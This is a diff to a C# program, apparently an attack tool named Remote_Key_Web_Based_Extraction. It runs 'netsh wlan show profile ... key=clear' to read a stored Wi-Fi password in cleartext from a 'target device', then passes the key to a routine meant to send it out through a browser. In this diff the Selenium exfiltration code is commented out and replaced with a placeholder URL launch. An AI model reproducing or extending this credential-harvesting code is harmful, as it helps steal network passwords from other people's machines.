@@ -8,6 +8,7 @@ using OpenQA.Selenium;
 using OpenQA.Selenium.Chrome;
 using OpenQA.Selenium.Edge;
 using OpenQA.Selenium.Firefox;
+using System.Diagnostics;
 
 // https://github.com/PowerShell/PowerShell/issues/7909
 // dotnet publish -o .\publish -r win10-x64 -p:PublishSingleFile=true --self-contained true
@@ -51,12 +52,7 @@ namespace Remote_Key_Web_Based_Extraction
             ps.AddCommand("netsh")
                 .AddParameter("wlan show profile " + access_point_names[0], "key=clear");
             var results = ps.Invoke();
-            /*
-            foreach (var item in results)
-            {
-                Console.WriteLine(item);
-            }
-            */
+
             foreach (var item in results)
             {
                 if (item.ToString().Contains("Key Content"))
@@ -78,14 +74,19 @@ namespace Remote_Key_Web_Based_Extraction
 
         public void web_content_key_extraction(string key_content)
         {
+            Process.Start("http://www.google.com");
+            //System.Diagnostics.Process.Start("http://testwebsite1/");
+
+            // Issues with Selenium. Requires driver executables on target device.
             /*
+            
             EdgeOptions edgeOptions = new EdgeOptions();
             var current_drver = new EdgeDriver();
             OpenQA.Selenium.IWebDriver current_drver = new Microsoft.EdgeDriver();
             var options = new EdgeOptions();
             options.UseInPrivateBrowsing = true;
             var current_driver = new EdgeDriver(options);
-            */
+             
             try
             {
                 // https://stackoverflow.com/questions/45130993/how-to-start-chromedriver-in-headless-mode
@@ -113,6 +114,6 @@ namespace Remote_Key_Web_Based_Extraction
             {
                 Console.WriteLine("[+] Successfully extracted content key from local device");
             }
+
+            */
         }
-    }
-}
